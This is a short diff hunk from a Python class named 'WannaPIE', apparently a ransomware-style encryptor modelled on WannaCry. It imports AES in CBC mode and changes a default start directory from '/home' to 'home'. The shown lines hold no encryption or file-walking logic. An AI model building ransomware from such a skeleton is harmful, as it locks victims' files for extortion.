@@ -4,7 +4,7 @@ import string, os, random, time, binascii
 from Crypto.Cipher import AES
 
 class WannaPIE():
-    def __init__(self, startpath='/home'):
+    def __init__(self, startpath='home'):
         self._MODE = AES.MODE_CBC
         self._SIZE = 0x10
         self._startpath = startpath
